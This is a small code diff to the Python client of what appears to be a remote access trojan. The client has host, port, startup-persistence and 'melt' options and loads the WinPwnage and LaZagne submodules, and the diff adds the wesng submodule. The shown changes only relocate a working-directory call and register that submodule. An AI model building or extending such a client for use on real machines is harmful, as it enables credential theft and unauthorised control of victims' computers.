@@ -11,6 +11,9 @@ import sys
 
 from cryptography.fernet import InvalidToken
 
+# make sure working dir is same as file dir
+os.chdir(os.path.dirname(os.path.abspath(__file__)))
+
 # append path, needed for all 'main' files
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir)))
 
@@ -26,6 +29,7 @@ elif platforms.OS == platforms.WINDOWS:
 
     helper.init_submodule("WinPwnage")
     helper.init_submodule("LaZagne/Windows")
+    helper.init_submodule("wesng")
 else:
     print("Platform not supported")
     sys.exit(0)
@@ -41,8 +45,6 @@ from src import logger
 
 class MainClient:
     def __init__(self, host, port, is_host_name=False, add_to_startup=False, melt=False):
-        os.chdir(os.path.dirname(os.path.abspath(__file__)))  # make sure working dir is same as file dir
-
         self._args = Args(self)
         logger.init(self._args.get_args())
 
